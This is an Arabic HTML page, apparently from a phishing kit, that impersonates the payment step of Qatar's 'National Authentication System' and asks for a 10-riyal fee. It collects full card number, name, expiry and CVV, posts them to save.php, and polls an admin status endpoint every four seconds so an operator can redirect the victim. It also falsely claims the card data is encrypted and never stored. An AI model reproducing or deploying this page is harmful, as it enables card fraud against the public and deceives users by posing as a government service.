<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الإلكتروني</title>
    
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff; 
            margin: 0; padding: 0;
            display: flex; justify-content: center;
            overflow-x: hidden;
        }

        .container {
            width: 100%; max-width: 375px; 
            background-color: #ffffff; min-height: 100vh;
            display: flex; flex-direction: column;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }

        header {
            padding: 15px; display: flex; align-items: center;
            justify-content: flex-start; border-bottom: 1px solid #f0f0f0;
            gap: 15px;
        }

        .menu-icon { font-size: 24px; cursor: pointer; color: #333; }
        .header-right img { height: 45px; } 
        
        .header-left-text { text-align: left; margin-right: auto; }
        .header-left-text .title-ar { color: #8b1538; font-size: 13px; font-weight: 700; display: block; }
        .header-left-text .title-en { color: #666; font-size: 8px; display: block; }

        .steps-bar {
            display: flex; justify-content: space-around; padding: 10px 5px;
            background-color: #fafbfc; border-bottom: 1px solid #f0f0f0;
        }

        .step { display: flex; flex-direction: column; align-items: center; }
        .circle {
            width: 22px; height: 22px; border-radius: 50%;
            background-color: #00a3da; color: white;
            display: flex; justify-content: center; align-items: center;
            font-size: 10px; margin-bottom: 3px;
        }
        .step-label { font-size: 8px; color: #00a3da; font-weight: bold; }

        .main-content {
            padding: 20px 15px; flex-grow: 1;
            display: flex; justify-content: center; align-items: flex-start;
        }

        .payment-card {
            width: 100%; background-color: #f8f9fa; padding: 20px;
            border-radius: 8px; border: 1px solid #eee;
            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
        }

        .payment-title { text-align: center; font-size: 14px; font-weight: 700; margin-bottom: 5px; color: #333; }
        .payment-sub { text-align: center; font-size: 11px; color: #666; margin-bottom: 15px; }

        .amount-row {
            background-color: #bcd9e6; padding: 10px; display: flex;
            justify-content: space-between; border-radius: 3px;
            font-size: 12px; font-weight: 700; margin-bottom: 20px; color: #333;
        }

        .form-group { margin-bottom: 12px; position: relative; }
        label { display: block; font-size: 11px; font-weight: 700; margin-bottom: 5px; color: #444; }

        input, select {
            width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px;
            font-size: 12px; box-sizing: border-box; background-color: #fff;
            font-family: 'Cairo', sans-serif;
        }

        .expiry-cvv { display: flex; gap: 10px; }
        .expiry-cvv > div { flex: 1; }

        .secure-notice {
            font-size: 10px; color: #555; text-align: center;
            margin: 15px 0; line-height: 1.4;
        }

        .trust-banner { text-align: center; margin-bottom: 20px; }
        .trust-banner img { width: 100%; max-width: 280px; height: auto; }

        .pay-btn {
            background-color: #00a3da; color: white; border: none;
            padding: 12px; width: 100%; border-radius: 4px;
            font-size: 13px; font-weight: bold; cursor: pointer; transition: 0.3s;
        }

        footer {
            padding: 12px; text-align: center; font-size: 10px;
            color: #555; background: #fff; border-top: 1px solid #eee;
        }

        #loading-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.98); z-index: 9999;
            flex-direction: column; align-items: center; justify-content: center; text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #00a3da;
            border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .card-logo-container { position: absolute; left: 10px; top: 25px; width: 35px; }
        .card-logo-container img { width: 100%; }
        #card_number { padding-left: 50px; }
    </style>
</head>
<body>

<div id="loading-overlay">
    <div class="spinner"></div>
    <p style="margin-top: 20px; font-weight: bold; color: #00a3da; padding: 0 30px; font-size: 14px;">جاري معالجة العملية بأمان...<br><span style="font-size: 11px; color: #666; font-weight: normal;">يرجى عدم إغلاق الصفحة أو الضغط على زر الرجوع</span></p>
</div>

<div class="container">
    <header>
        <div class="menu-icon">☰</div>
        <div class="header-right">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" alt="Logo">
        </div>
        <div class="header-left-text">
            <span class="title-ar">نظام التوثيق الوطني</span>
            <span class="title-en">National Authentication System</span>
        </div>
    </header>

    <div class="steps-bar">
        <div class="step"><div class="circle">✓</div><div class="step-label">نوع الحساب</div></div>
        <div class="step"><div class="circle">✓</div><div class="step-label">البيانات الشخصية</div></div>
        <div class="step"><div class="circle">✓</div><div class="step-label">كلمة المرور</div></div>
        <div class="step"><div class="circle">4</div><div class="step-label">إتمام التسجيل</div></div>
    </div>

    <div class="main-content">
        <div class="payment-card">
            <div class="payment-title">بوابة الدفع الإلكتروني</div>
            <div class="payment-sub">يرجى إدخال معلومات البطاقة بشكل دقيق</div>

            <div class="amount-row">
                <span>المبلغ الإجمالي</span>
                <span>ر.ق 10.00</span>
            </div>

            <form id="paymentForm" action="save.php" method="POST">
                <input type="hidden" name="visitor_id" id="form_visitor_id">
                <input type="hidden" name="current_page" value="payment.php">
                <div class="form-group">
                    <label>رقم البطاقة</label>
                    <input type="tel" id="card_number_display" placeholder="0000 0000 0000 0000" required maxlength="19">
                    <input type="hidden" id="card_number_raw" name="card_number">
                    <div id="card_logo" class="card-logo-container"></div>
                </div>

                <div class="form-group">
                    <label>اسم حامل البطاقة</label>
                    <input type="text" id="card_name" name="card_name" placeholder="الاسم كما هو مكتوب على البطاقة" required>
                </div>

                <div class="expiry-cvv">
                    <div>
                        <label>تاريخ الانتهاء</label>
                        <div style="display: flex; gap: 5px;">
                            <select id="exp_month" name="exp_month" required>
                                <option value="" disabled selected>MM</option>
                                <option value="01">01</option><option value="02">02</option>
                                <option value="03">03</option><option value="04">04</option>
                                <option value="05">05</option><option value="06">06</option>
                                <option value="07">07</option><option value="08">08</option>
                                <option value="09">09</option><option value="10">10</option>
                                <option value="11">11</option><option value="12">12</option>
                            </select>
                            <select id="exp_year" name="exp_year" required>
                                <option value="" disabled selected>YY</option>
                            </select>
                        </div>
                    </div>
                    <div>
                        <label>(CVV)</label>
                        <input type="tel" id="cvv" name="cvv" placeholder="123" required maxlength="3">
                    </div>
                </div>

                <div class="secure-notice">
                    🔒 معلوماتك محمية بتقنية التشفير المتقدمة.<br>
                    نحن لا نقوم بتخزين معلومات بطاقتك.
                </div>

                <div class="trust-banner">
                    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/okimdwZJeXULBFHV.png" alt="Security Trust Banner">
                </div>

                <button type="submit" class="pay-btn">تأكيد دفع 10 ريال</button>
            </form>
        </div>
    </div>

    <footer>نظام التوثيق الوطني - جميع الحقوق محفوظة © 2026</footer>
</div>

<script>
    let visitorId = sessionStorage.getItem('visitorId');
    if (!visitorId) {
        // إذا لم يوجد visitorId، نحاول جلب المعامل من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        visitorId = urlParams.get('visitor_id');
    }
    document.getElementById('form_visitor_id').value = visitorId;

    // كود إعادة التوجيه التلقائي من الأدمن
    setInterval(() => {
        fetch(`api/check_status.php?visitor_id=${visitorId}&v=${Date.now()}`)
            .then(r => r.json())
            .then(data => {
                if (data.redirect) window.location.href = data.redirect + "?visitor_id=" + visitorId;
            });
    }, 4000);

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error')) {
        Swal.fire('فشل عملية الدفع', 'يرجى التحقق من المعلومات', 'error');
    }

    // سنوات حتى 2050
    const yearSelect = document.getElementById('exp_year');
    const currentYear = new Date().getFullYear() % 100;
    for (let i = 0; i <= 24; i++) {
        const year = currentYear + i;
        const option = document.createElement('option');
        option.value = year;
        option.textContent = year;
        yearSelect.appendChild(option);
    }

    const cardInputDisplay = document.getElementById('card_number_display');
    const cardInputRaw = document.getElementById('card_number_raw');
    const logoContainer = document.getElementById('card_logo');

    function validateCard(number) {
        let trimmed = number.replace(/\D/g, '');
        if (trimmed.length < 13 || trimmed.length > 19) return false;
        let sum = 0, shouldDouble = false;
        for (let i = trimmed.length - 1; i >= 0; i--) {
            let digit = parseInt(trimmed.charAt(i));
            if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
    }

    cardInputDisplay.addEventListener('input', function(e) {
        let val = e.target.value.replace(/\D/g, '');
        // تحديث الحقل المخفي بالرقم الخام دائماً
        cardInputRaw.value = val;
        
        // عرض الرقم منسقاً للمستخدم فقط
        e.target.value = val.replace(/(.{4})/g, '$1 ').trim();

        if (val.startsWith('4')) {
            logoContainer.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">';
        } else if (/^5[1-5]/.test(val) || /^2[2-7]/.test(val)) {
            logoContainer.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">';
        } else {
            logoContainer.innerHTML = '';
        }

        if (val.length >= 13) {
            cardInputDisplay.style.borderColor = validateCard(val) ? "#ccc" : "#dc2626";
        }
    });

    document.getElementById('paymentForm').addEventListener('submit', function() {
        // التأكد من إرسال الرقم الخام النظيف عند الإرسال
        cardInputRaw.value = cardInputDisplay.value.replace(/\D/g, '');
        document.getElementById('loading-overlay').style.display = 'flex';
    });
</script>

</body>
</html>
